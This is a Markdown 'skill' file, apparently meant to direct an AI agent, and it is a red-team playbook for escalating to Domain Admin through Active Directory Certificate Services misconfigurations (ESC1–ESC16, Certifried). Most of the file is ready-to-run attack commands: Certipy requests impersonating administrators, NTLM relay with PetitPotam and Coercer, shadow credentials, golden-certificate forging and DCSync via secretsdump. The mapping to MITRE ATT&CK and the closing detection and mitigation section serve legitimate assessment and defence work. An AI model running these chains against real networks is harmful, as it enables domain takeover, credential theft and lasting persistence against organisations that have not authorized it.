---
name: offensive-adcs
description: "Active Directory Certificate Services (AD CS) domain-escalation skill covering the full ESC1-ESC16 misconfiguration catalogue for red team engagements. Covers vulnerable-template enumeration with Certipy (certipy find -vulnerable) and Certify, enrollee-supplied SAN abuse (ESC1), Any Purpose / SubCA EKU (ESC2), Enrollment Agent templates (ESC3), template and PKI-object ACL abuse (ESC4, ESC5), EDITF_ATTRIBUTESUBJECTALTNAME2 SAN injection (ESC6), ManageCA / ManageCertificates role abuse (ESC7), NTLM relay to HTTP web enrollment and ICertPassage RPC with PetitPotam / Coercer coercion (ESC8, ESC11), certificate-mapping and altSecurityIdentities weaknesses (ESC9, ESC10, ESC14), issuance-policy-to-group links (ESC13), application-policy injection / EKUwu CVE-2024-49019 (ESC15), and disabled security extension on the CA (ESC16). Includes PKINIT certificate authentication (certipy auth), UnPAC-the-hash, pass-the-cert via LDAP shadow credentials and Schannel, certipy shadow auto, and Certifried CVE-2022-26923. Use when assessing AD CS / PKI, escalating from a low-privileged domain user to Domain Admin or Domain Controller via certificates, or hunting certificate-based persistence and defender mitigations."
---

# Active Directory Certificate Services — ESC Domain Escalation

Active Directory Certificate Services is the single most reliable privilege-escalation surface in a modern AD estate: a certificate that encodes a privileged identity is a durable, offline credential that survives password resets and often sidesteps the telemetry watching Kerberos and NTLM. The ESC catalogue (ESC1 through ESC16, as of the SpecterOps "Certified Pre-Owned" research and its successors) enumerates the template, CA-object, enrollment-service, and certificate-mapping misconfigurations that let a low-privileged principal mint a cert for Domain Admin or a Domain Controller. This skill treats AD CS as its own kill chain — enumerate, request, authenticate, persist — and assumes you already hold a foothold as any authenticated domain user. Work only against systems you are authorized to test; every command below is written against `example.com` / `192.0.2.0/24` placeholders.

## Quick Workflow

1. Confirm a CA exists and you can reach it (`certipy find`, LDAP `pKIEnrollmentService` objects under the Configuration NC)
2. Enumerate vulnerable templates and CA settings offline (`certipy find -vulnerable -stdout`; Certify from a Windows foothold)
3. Classify each finding to an ESC ID and pick the lowest-noise path to a privileged identity
4. Request the certificate (enrollee-supplied SAN, EKU abuse, relay, or ACL-write-then-request)
5. Authenticate with the cert via PKINIT (`certipy auth`) to recover a TGT and the NT hash, or pass-the-cert over LDAP/Schannel
6. Escalate (DCSync / shadow credentials) and, if persistence is in scope, bank a long-lived machine or CA cert
7. Document the template name, CA name, exact ACE, and resulting identity for the report

---

## Enumeration

### Certipy (Linux, primary)

```bash
# Full collection — dumps templates, CAs, ACLs to JSON/BloodHound and prints a findings table
certipy find -u user@example.com -p 'Password123!' -dc-ip 192.0.2.10

# Only show templates/CAs that are actually exploitable, straight to stdout
certipy find -u user@example.com -p 'Password123!' -dc-ip 192.0.2.10 -vulnerable -stdout

# With Kerberos (use an existing ccache instead of a password)
KRB5CCNAME=user.ccache certipy find -k -no-pass -target ca.example.com -vulnerable -stdout

# Offline triage — point at the JSON later without touching the network again
certipy find -u user@example.com -p 'Password123!' -dc-ip 192.0.2.10 -json -output adcs
```

Read the findings table top-down: the `[!] Vulnerabilities` block tags each template with its ESC ID (`ESC1`, `ESC2`, …), and the CA entry flags `ESC6`, `ESC7`, `ESC8`, `ESC11`, and `ESC16`. Note the `Certificate Authorities` → `Web Enrollment` and `Request Disposition` fields — they decide whether relay (ESC8/ESC11) is live and whether requests auto-issue.

### Certify (Windows foothold)

```powershell
# Find vulnerable templates from a domain-joined (or runas /netonly) context
Certify.exe find /vulnerable

# Enumerate everything, including CA permissions (ManageCA/ManageCertificates -> ESC7)
Certify.exe find /ca:ca.example.com\Example-CA

# Certipy's Windows sibling / updated fork also works via Certify 2.0 or the certutil fallback:
certutil.exe -config "ca.example.com\Example-CA" -CAInfo
certutil.exe -template     # dump template OIDs/flags locally
```

### What makes a template dangerous

| Signal | Meaning |
|--------|---------|
| `Enrollee Supplies Subject` ✓ | Requester chooses the SAN → ESC1 (with client-auth EKU) |
| `Client Authentication` / `Smart Card Logon` / `PKINIT` / `Any Purpose` EKU | Cert can log on as a user |
| `Any Purpose` or no EKU / `SubCA` | ESC2 — cert usable for anything |
| `Certificate Request Agent` EKU | ESC3 — enrollment agent, request on behalf of others |
| Low-priv principal has `Write`/`WriteDacl`/`WriteOwner`/`FullControl` on template | ESC4 |
| `Manager Approval` disabled + `Authenticated Users` can enroll | Auto-issue, no human in the loop |
| CA flag `EDITF_ATTRIBUTESUBJECTALTNAME2` | ESC6 — SAN injection on any template |
| `No Security Extension` on template | ESC9 (pairs with weak mapping) |

---

## ESC1 — Enrollee-Supplied SAN

The template has a client-authentication EKU, allows the requester to supply the Subject Alternative Name, and grants enrollment to low-privileged users with no manager approval. You request a certificate for yourself but set the SAN UPN to a privileged account.

```bash
# Request a cert for Administrator via the vulnerable template
certipy req -u user@example.com -p 'Password123!' -dc-ip 192.0.2.10 \
  -ca Example-CA -template ESC1-Template \
  -upn administrator@example.com

# SAN can also be a machine account (append the DNS name) to impersonate a DC
certipy req -u user@example.com -p 'Password123!' -dc-ip 192.0.2.10 \
  -ca Example-CA -template ESC1-Template \
  -upn 'DC01$@example.com' -dns dc01.example.com

# Then authenticate as the impersonated principal
certipy auth -pfx administrator.pfx -dc-ip 192.0.2.10
```

```powershell
# Certify equivalent
Certify.exe request /ca:ca.example.com\Example-CA /template:ESC1-Template /altname:administrator@example.com
# Convert the resulting PEM to a usable PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

If PKINIT is disabled in the domain but the cert still authenticates, fall back to Schannel/LDAP (see Pass-the-Cert).

---

## ESC2 — Any Purpose or SubCA EKU

The template carries the **Any Purpose** EKU (OID `2.5.29.37.0`) or has no EKU at all (a SubCA-style template). A cert issued from it is valid for any use, including client authentication, so you escalate exactly as ESC1 if the template also allows an enrollee-supplied subject; otherwise you use it as an enrollment-agent-equivalent or for signing.

```bash
# Request an Any Purpose cert; if SAN is enrollee-supplied, impersonate directly
certipy req -u user@example.com -p 'Password123!' -dc-ip 192.0.2.10 \
  -ca Example-CA -template ESC2-Template -upn administrator@example.com

# If the template is a SubCA/no-EKU cert, it can be used to sign further requests
certipy auth -pfx administrator.pfx -dc-ip 192.0.2.10
```

---

## ESC3 — Enrollment Agent Template

The template grants the **Certificate Request Agent** EKU (OID `1.3.6.1.4.1.311.20.2.1`). You enroll for an enrollment-agent cert, then use it to request a certificate *on behalf of* any user from any template that permits agent enrollment.

```bash
# Step 1: get the enrollment agent certificate
certipy req -u user@example.com -p 'Password123!' -dc-ip 192.0.2.10 \
  -ca Example-CA -template ESC3-Agent

# Step 2: use the agent cert to request a client-auth cert as Administrator
certipy req -u user@example.com -p 'Password123!' -dc-ip 192.0.2.10 \
  -ca Example-CA -template User \
  -on-behalf-of 'EXAMPLE\administrator' -pfx user.pfx

# Step 3: authenticate as Administrator
certipy auth -pfx administrator.pfx -dc-ip 192.0.2.10
```

```powershell
Certify.exe request /ca:ca.example.com\Example-CA /template:ESC3-Agent /enrollmentAgent
Certify.exe request /ca:ca.example.com\Example-CA /template:User /onBehalfOf:EXAMPLE\administrator /enrollCert:agent.pfx
```

---

## ESC4 — Template ACL Write → Turn Into ESC1

You hold a dangerous write right (`WriteDacl`, `WriteOwner`, `WriteProperty`, `GenericWrite`, or `FullControl`) over a certificate template object. Rewrite the template to be ESC1-vulnerable, enroll, then restore it to avoid leaving a standing misconfiguration.

```bash
# Certipy can reconfigure the template to an ESC1 posture in one shot and (optionally) restore it
certipy template -u user@example.com -p 'Password123!' -dc-ip 192.0.2.10 \
  -template ESC4-Template -write-default-configuration   # back up current config first
certipy template -u user@example.com -p 'Password123!' -dc-ip 192.0.2.10 \
  -template ESC4-Template                                # apply the ESC1-enabling config

# Now exploit it exactly like ESC1
certipy req -u user@example.com -p 'Password123!' -dc-ip 192.0.2.10 \
  -ca Example-CA -template ESC4-Template -upn administrator@example.com

# Restore the saved configuration when done (clean up!)
certipy template -u user@example.com -p 'Password123!' -dc-ip 192.0.2.10 \
  -template ESC4-Template -configuration ESC4-Template.json
```

Always save the original template configuration before writing — restoring it is part of responsible engagement hygiene and avoids breaking production enrollment.

---

## ESC5 — CA / PKI Object ACLs

Escalation here is indirect: you control an object that the PKI depends on rather than a template. Targets include the CA computer object, the `pKIEnrollmentService` and template containers under `CN=Public Key Services,CN=Services,CN=Configuration,DC=example,DC=com`, the CA server's AD computer object, or the CA server itself (local admin). Compromise of any of these lets you reach ESC7-style control or simply replace template/CA configuration.

```bash
# Hunt for dangerous ACLs over the PKI configuration containers with BloodHound/Certipy JSON
certipy find -u user@example.com -p 'Password123!' -dc-ip 192.0.2.10 -json -output pki

# Example: you have GenericAll on the CA's AD computer object -> shadow credentials to own the host
certipy shadow auto -u user@example.com -p 'Password123!' -dc-ip 192.0.2.10 \
  -account 'CA01$'
```

```powershell
# Inspect ACLs on the PKI container from Windows
Get-Acl "AD:CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=example,DC=com" |
  Select-Object -ExpandProperty Access
```

Once you own the CA host or its AD object, pivot to ESC7 (role abuse) or extract the CA private key for forging (see Persistence).

---

## ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2

The CA has the `EDITF_ATTRIBUTESUBJECTALTNAME2` policy flag set, which tells it to honor requester-supplied SANs on **any** template — even ones that don't allow enrollee-supplied subjects. Any template you can enroll in that has a client-auth EKU becomes an ESC1.

```bash
# Confirm the flag (shown in certipy find output under the CA, or via certutil)
certutil -config "ca.example.com\Example-CA" -getreg policy\EditFlags

# Request a cert on a normal template but inject the SAN
certipy req -u user@example.com -p 'Password123!' -dc-ip 192.0.2.10 \
  -ca Example-CA -template User -upn administrator@example.com

certipy auth -pfx administrator.pfx -dc-ip 192.0.2.10
```

Note: since the May 2022 certificate-mapping hardening (KB5014754), successful ESC6 abuse depends on the SAN still being honored for mapping; pair with ESC9/ESC10 analysis if authentication is rejected.

---

## ESC7 — ManageCA / ManageCertificates Role Abuse

You hold the **ManageCA** or **ManageCertificates** (certificate manager) role on the CA. ManageCA lets you flip CA settings (including enabling `EDITF_ATTRIBUTESUBJECTALTNAME2` to self-create ESC6, or enabling the SubCA template); ManageCertificates lets you approve pending requests. The canonical chain is ESC7 → ESC1: enable the SubCA template, submit a request that goes pending, then approve your own request.

```bash
# You have ManageCA: grant yourself the ManageCertificates (officer) right too
certipy ca -u user@example.com -p 'Password123!' -dc-ip 192.0.2.10 \
  -ca Example-CA -add-officer user

# Enable the built-in SubCA template on the CA (requestable, but needs approval)
certipy ca -u user@example.com -p 'Password123!' -dc-ip 192.0.2.10 \
  -ca Example-CA -enable-template SubCA

# Request against SubCA with an admin SAN -> it goes pending; note the request ID
certipy req -u user@example.com -p 'Password123!' -dc-ip 192.0.2.10 \
  -ca Example-CA -template SubCA -upn administrator@example.com
# [-] request is pending, request ID 1337

# Approve (issue) your own pending request using ManageCertificates
certipy ca -u user@example.com -p 'Password123!' -dc-ip 192.0.2.10 \
  -ca Example-CA -issue-request 1337

# Retrieve the now-issued cert and authenticate
certipy req -u user@example.com -p 'Password123!' -dc-ip 192.0.2.10 \
  -ca Example-CA -retrieve 1337
certipy auth -pfx administrator.pfx -dc-ip 192.0.2.10
```

Alternatively, with ManageCA alone you can set `EDITF_ATTRIBUTESUBJECTALTNAME2` and immediately exploit ESC6 instead of the SubCA approval dance.

---

## ESC8 — NTLM Relay to HTTP Web Enrollment

The CA exposes the Web Enrollment interface (`http://ca.example.com/certsrv/`) over HTTP without Extended Protection for Authentication (EPA). You coerce a privileged machine (a DC) into authenticating to you, relay that NTLM authentication to the web enrollment endpoint, and request a certificate as the coerced machine. A DC certificate then yields a TGT and DCSync.

```bash
# Terminal 1: relay inbound NTLM to the CA web enrollment, requesting a DC template
ntlmrelayx.py -t http://ca.example.com/certsrv/certfnsh.asp -smb2support \
  --adcs --template DomainController

# Terminal 2: coerce the DC to authenticate to the relay (attacker = 192.0.2.50)
python3 PetitPotam.py 192.0.2.50 dc01.example.com
# or, protocol-agnostic coercion
coercer coerce -l 192.0.2.50 -t dc01.example.com -u user -p 'Password123!' -d example.com

# ntlmrelayx prints the base64 cert for DC01$ -> authenticate and DCSync
certipy auth -pfx dc01.pfx -dc-ip 192.0.2.10
certipy auth -pfx dc01.pfx -dc-ip 192.0.2.10 -ldap-shell   # or go straight to secretsdump
```

Prefer coercion primitives in this order of stealth/reliability: PrinterBug (`MS-RPRN`), PetitPotam (`MS-EFSRPC`), DFSCoerce (`MS-DFSNM`), ShadowCoerce (`MS-FSRVP`). `Coercer` wraps all of them.

---

## ESC9 / ESC10 — No Security Extension & Weak Certificate Mapping

Both abuse the way certificates map back to accounts after the 2022 hardening. **ESC9**: a template has the `CT_FLAG_NO_SECURITY_EXTENSION` flag, so the issued cert lacks the `szOID_NTDS_CA_SECURITY_EXT` SID binding, and the CA/DC falls back to UPN-based mapping. **ESC10**: the DC registry weakens mapping — `StrongCertificateBindingEnforcement = 0` (Kerberos) or `CertificateMappingMethods` includes the weak UPN bit `0x4` (Schannel). In both cases you rewrite a controlled account's `userPrincipalName` to match a target, enroll, then revert.

```bash
# Prereq: you control an account (e.g. via GenericWrite) whose UPN you can edit.
# Set the shadow account's UPN to the victim (omit the @domain for machine targets)
certipy account update -u user@example.com -p 'Password123!' -dc-ip 192.0.2.10 \
  -user controlled -upn administrator@example.com

# Enroll with the controlled account against the no-security-extension template (ESC9)
certipy req -u controlled@example.com -p 'Password123!' -dc-ip 192.0.2.10 \
  -ca Example-CA -template ESC9-Template

# Revert the UPN so the cert now maps to the real Administrator
certipy account update -u user@example.com -p 'Password123!' -dc-ip 192.0.2.10 \
  -user controlled -upn controlled@example.com

# Authenticate as Administrator
certipy auth -pfx administrator.pfx -dc-ip 192.0.2.10
```

```powershell
# Check the DC mapping registry for ESC10 conditions
reg query HKLM\SYSTEM\CurrentControlSet\Services\Kdc /v StrongCertificateBindingEnforcement
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL /v CertificateMappingMethods
```

`StrongCertificateBindingEnforcement = 2` (full enforcement) and dropping the `0x4` Schannel bit close these paths.

---

## ESC11 — Relay to ICertPassage RPC

Like ESC8 but over RPC instead of HTTP. If the CA's `ICertPassage` (MS-ICPR) RPC interface does not enforce `IF_ENFORCEENCRYPTICERTREQUEST` packet privacy, you can relay coerced NTLM to the RPC endpoint and request a certificate — useful when the HTTP web enrollment role is not installed.

```bash
# Use the ntlmrelayx fork/branch that supports -t rpc:// for ICPR
ntlmrelayx.py -t rpc://ca.example.com -rpc-mode ICPR -icpr-ca-name Example-CA \
  -smb2support --adcs --template DomainController

# Coerce as in ESC8
coercer coerce -l 192.0.2.50 -t dc01.example.com -u user -p 'Password123!' -d example.com

certipy auth -pfx dc01.pfx -dc-ip 192.0.2.10
```

---

## ESC13 — Issuance Policy Linked to a Group

A certificate template is bound to an **issuance policy** (application policy / certificate-issuance-policy OID) whose AD object has an `msDS-OIDToGroupLink` pointing at a privileged group. Enrolling in that template yields a cert whose authentication grants effective membership in the linked group — no SAN spoofing required.

```bash
# certipy find flags ESC13 and names the linked group. Enroll normally:
certipy req -u user@example.com -p 'Password123!' -dc-ip 192.0.2.10 \
  -ca Example-CA -template ESC13-Template

# Authenticate — the resulting token carries the linked group's membership
certipy auth -pfx user.pfx -dc-ip 192.0.2.10 -ldap-shell
```

Identify the link from the OID container under `CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,...` where `msDS-OIDToGroupLink` references a group DN.

---

## ESC14 — Weak Explicit altSecurityIdentities Mapping

The `altSecurityIdentities` attribute on an account provides explicit certificate-to-account mappings. If you can write it (via an ACL) and the configured mapping is weak (issuer-and-subject or an X.509 subject/RFC822 string rather than a strong SKI/SHA1-PUKEY/serial+issuer), you map an attacker-controlled certificate to a privileged account and authenticate as it.

```bash
# You have write over the victim's attributes. Map a cert you can produce to them.
# Weak (abusable) forms include X509:<I>...<S>... issuer/subject strings.
certipy account update -u user@example.com -p 'Password123!' -dc-ip 192.0.2.10 \
  -user administrator \
  -alt-security-identities 'X509:<I>DC=com,DC=example,CN=Example-CA<S>CN=attacker'

# Present a cert whose issuer/subject match the weak mapping, then authenticate
certipy auth -pfx attacker.pfx -dc-ip 192.0.2.10
```

Strong mappings (`X509:<SKI>`, `X509:<SHA1-PUKEY>`, `X509:<I>...<SR>` serial+issuer) bind to cryptographic material and are not forgeable this way.

---

## ESC15 / EKUwu — Application Policies in v1 Templates (CVE-2024-49019)

Schema version 1 templates (e.g. the built-in **WebServer** template) let the requester inject arbitrary **application policies** into the CSR. Because the CA copies them into the issued certificate, you can add the Client Authentication or Certificate Request Agent application policy to a template that was never meant for logon, then authenticate with the result. This is EKUwu, tracked as CVE-2024-49019.

```bash
# Inject the Client Authentication application policy into a v1 template request,
# supplying an admin SAN at the same time
certipy req -u user@example.com -p 'Password123!' -dc-ip 192.0.2.10 \
  -ca Example-CA -template WebServer \
  -upn administrator@example.com \
  -application-policies 'Client Authentication'

certipy auth -pfx administrator.pfx -dc-ip 192.0.2.10

# Or inject the enrollment-agent application policy to pivot into an ESC3-style on-behalf-of
certipy req -u user@example.com -p 'Password123!' -dc-ip 192.0.2.10 \
  -ca Example-CA -template WebServer \
  -application-policies 'Certificate Request Agent'
```

Patch: Microsoft's November 2024 updates (CVE-2024-49019) stop v1 templates from honoring requester-supplied application policies when the subject is built from AD. Still worth checking on unpatched CAs.

---

## ESC16 — Security Extension Disabled on the CA

The CA is globally configured to omit the `szOID_NTDS_CA_SECURITY_EXT` SID security extension from **every** certificate it issues (the `DisableExtensionList` includes the OID `1.3.6.1.4.1.311.25.2`). This is ESC9 applied CA-wide: all issued certs lack the strong SID binding, so any template with a client-auth EKU becomes exploitable via UPN mapping / account-rename tricks.

```bash
# certipy find reports the disabled extension on the CA. Confirm via certutil:
certutil -config "ca.example.com\Example-CA" -getreg policy\DisableExtensionList

# Exploit identically to ESC9: borrow a UPN, enroll, revert, authenticate
certipy account update -u user@example.com -p 'Password123!' -dc-ip 192.0.2.10 \
  -user controlled -upn administrator@example.com
certipy req -u controlled@example.com -p 'Password123!' -dc-ip 192.0.2.10 \
  -ca Example-CA -template User
certipy account update -u user@example.com -p 'Password123!' -dc-ip 192.0.2.10 \
  -user controlled -upn controlled@example.com
certipy auth -pfx administrator.pfx -dc-ip 192.0.2.10
```

---

## Certifried — CVE-2022-26923

Separate from the ESC catalogue but AD CS-adjacent: by default any authenticated user can create machine accounts (`ms-DS-MachineAccountQuota`) and edit their `dNSHostName`. Certifried abuses the pre-2022 cert mapping — you create a machine account, set its `dNSHostName` to collide with a DC, enroll the default **Machine** template, and the issued cert maps to the DC.

```bash
# Create a machine account you control
certipy account create -u user@example.com -p 'Password123!' -dc-ip 192.0.2.10 \
  -user 'evilpc$' -pass 'MachinePass123!' -dns dc01.example.com

# Request a machine cert; it maps to DC01$ on unpatched DCs
certipy req -u 'evilpc$@example.com' -p 'MachinePass123!' -dc-ip 192.0.2.10 \
  -ca Example-CA -template Machine

certipy auth -pfx dc01.pfx -dc-ip 192.0.2.10
```

Patched by KB5014754; included here because it co-occurs with ESC findings on older estates.

---

## Using the Certificate — Authenticate, UnPAC, Pass-the-Cert

### PKINIT → TGT and NT hash

`certipy auth` performs PKINIT with the issued cert to obtain a Kerberos TGT, then uses the UnPAC-the-hash technique (the PAC in the TGT reply contains the account's NTLM hash encrypted to the session key) to recover the account's NT hash for reuse.

```bash
# PKINIT auth: writes a .ccache and prints the recovered NT hash
certipy auth -pfx administrator.pfx -dc-ip 192.0.2.10
# [*] Got TGT
# [*] Got hash for 'administrator@example.com': aad3b...:<NThash>

# Reuse the TGT
KRB5CCNAME=administrator.ccache secretsdump.py -k -no-pass dc01.example.com

# Reuse the recovered NT hash (overpass / PTH)
nxc smb 192.0.2.10 -u administrator -H <NThash>
```

### Pass-the-Cert (when PKINIT is unavailable)

If the KDC rejects PKINIT (no DC cert, or Kerberos binding enforced) but LDAPS/Schannel accepts client certs, authenticate directly to LDAP with the certificate and perform privileged writes — most usefully, grant yourself DCSync or set shadow credentials / RBCD.

```bash
# certipy's LDAP shell authenticates over Schannel with the PFX
certipy auth -pfx administrator.pfx -dc-ip 192.0.2.10 -ldap-shell
# ldap-shell> add_user_to_group user "Domain Admins"
# ldap-shell> set_rbcd DC01$ EVILPC$

# passthecert.py for raw Schannel LDAP operations
python3 passthecert.py -action ldap-shell -crt admin.crt -key admin.key \
  -domain example.com -dc-ip 192.0.2.10
```

### Shadow Credentials (certipy shadow auto)

Against any account you have `GenericWrite`/`GenericAll` over, write a Key Credential (`msDS-KeyCredentialLink`) so you own a cert-backed key for it, then PKINIT as that account. `shadow auto` does the add-authenticate-cleanup in one call.

```bash
# One-shot: add key credential, PKINIT, recover NT hash, remove the key credential
certipy shadow auto -u user@example.com -p 'Password123!' -dc-ip 192.0.2.10 \
  -account 'DC01$'
# [*] NT hash for 'DC01$': <NThash>

# Manual control if you want to keep the key credential as persistence
certipy shadow add -u user@example.com -p 'Password123!' -account victim -dc-ip 192.0.2.10
certipy shadow list -u user@example.com -p 'Password123!' -account victim -dc-ip 192.0.2.10
```

---

## Persistence

| Technique | What you keep | Notes |
|-----------|---------------|-------|
| User cert theft / enrollment | Long-lived client-auth cert for a privileged user | Survives password resets until cert expiry/revocation |
| Machine / DC cert | Cert for `DC01$` | Enables on-demand PKINIT → DCSync |
| CA private key theft | Forge arbitrary certs (Golden Certificate) | Extract with `certipy ca -backup` or Mimikatz `crypto::certificates /export` on the CA |
| Shadow credentials | `msDS-KeyCredentialLink` entry on target | Quiet; removable; see `certipy shadow` |

```bash
# Golden Certificate: steal the CA cert+key, then forge a cert for anyone, offline, forever
certipy ca -u admin@example.com -hashes :<NThash> -dc-ip 192.0.2.10 \
  -ca Example-CA -backup
certipy forge -ca-pfx Example-CA.pfx -upn administrator@example.com -subject 'CN=Administrator'
certipy auth -pfx administrator_forged.pfx -dc-ip 192.0.2.10
```

A forged Golden Certificate is not in the CA's issued-certs database, so it cannot be revoked by serial — only CA key rotation defeats it.

---

## Detection / Defender View

- **Certificate issuance events**: the CA logs issuance in the `CertificateServicesClient` operational log and Security event IDs **4886/4887** (request received / cert issued) and **4768** (Kerberos TGT via PKINIT). A **4768** where the certificate information names a different account than the requester is a strong ESC1/ESC6/ESC9 signal.
- **SAN vs requester mismatch**: issued certs whose SAN UPN differs from the enrolling principal are the core tell for ESC1/ESC6/ESC8. Correlate 4886/4887 requester SID against the cert SAN.
- **Template changes**: ESC4 shows up as directory-service changes (event **5136**) on `certificateTemplate` objects; ESC7 as CA configuration changes. Alert on any write to template ACLs or CA policy flags.
- **Coercion + relay (ESC8/ESC11)**: look for machine-account authentications to the CA web/RPC endpoints originating from unexpected hosts, and for `MS-EFSRPC`/`MS-RPRN` traffic to DCs from non-admin hosts.
- **Shadow credentials**: event **5136** writing `msDS-KeyCredentialLink`, especially on privileged or machine accounts.
- **Defensive tooling**: PKINITtools/`certutil -view`, Microsoft's own AD CS auditing (enable "Issue and manage certificate requests" auditing), BloodHound's Certify/ADCS edges, and Defender for Identity's AD CS detections (certificate-based escalation, suspicious certificate request).

### Mitigations (what to recommend)

```text
- Remove ENROLLEE_SUPPLIES_SUBJECT from client-auth templates (kills ESC1).
- Require manager approval and restrict enrollment to intended principals.
- Remove Any Purpose / no-EKU client-auth templates (ESC2); scope EKUs tightly.
- Audit and tighten template + PKI container ACLs (ESC4/ESC5); remove stray write rights.
- Clear EDITF_ATTRIBUTESUBJECTALTNAME2 on the CA (ESC6):
    certutil -config "ca\CA" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
- Restrict ManageCA/ManageCertificates to PKI admins only (ESC7).
- Enable EPA + HTTPS and disable NTLM on web enrollment; prefer removing the role (ESC8/ESC11).
- Set StrongCertificateBindingEnforcement = 2 and drop Schannel weak-map bit 0x4 (ESC9/ESC10/ESC16).
- Use only strong altSecurityIdentities mappings (SKI / SHA1-PUKEY / issuer+serial) (ESC14).
- Patch for CVE-2024-49019 (ESC15) and CVE-2022-26923 (Certifried); set MachineAccountQuota = 0.
- Rotate the CA key if a Golden Certificate is suspected.
```

---

## Engagement Cheatsheet

```bash
# 1. Enumerate — what's vulnerable and which CA
certipy find -u user@example.com -p 'Password123!' -dc-ip 192.0.2.10 -vulnerable -stdout

# 2. ESC1 (most common): request as admin, then auth
certipy req  -u user@example.com -p 'Password123!' -dc-ip 192.0.2.10 \
  -ca Example-CA -template ESC1-Template -upn administrator@example.com
certipy auth -pfx administrator.pfx -dc-ip 192.0.2.10

# 3. ESC8 (no vulnerable template, web enrollment up): relay + coerce
ntlmrelayx.py -t http://ca.example.com/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
coercer coerce -l 192.0.2.50 -t dc01.example.com -u user -p 'Password123!' -d example.com

# 4. ACL path (GenericWrite on an account): shadow credentials
certipy shadow auto -u user@example.com -p 'Password123!' -dc-ip 192.0.2.10 -account 'DC01$'

# 5. Loot with the recovered TGT / NT hash
KRB5CCNAME=administrator.ccache secretsdump.py -k -no-pass dc01.example.com
```

---

## Key References

- MITRE ATT&CK: T1649 (Steal or Forge Authentication Certificates), T1556 (Modify Authentication Process), T1550 (Use Alternate Authentication Material)
- SpecterOps "Certified Pre-Owned: Abusing Active Directory Certificate Services" — Will Schroeder & Lee Christensen (ESC1–ESC8 original research): https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf
- Certipy (ly4k) — tooling and ESC technique docs, including ESC9–ESC16: https://github.com/ly4k/Certipy
- Certify (GhostPack) — Windows AD CS enumeration/abuse: https://github.com/GhostPack/Certify
- CVE-2022-26923 (Certifried) — AD domain privilege escalation via certificate dNSHostName: https://nvd.nist.gov/vuln/detail/CVE-2022-26923
- CVE-2024-49019 (EKUwu / ESC15) — AD CS elevation via v1 template application policies: https://nvd.nist.gov/vuln/detail/CVE-2024-49019
- Microsoft KB5014754 — certificate-based authentication changes (strong mapping / security extension): https://support.microsoft.com/help/5014754
- Coercer (p0dalirius) — unified authentication coercion toolkit: https://github.com/p0dalirius/Coercer
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/active-directory.md
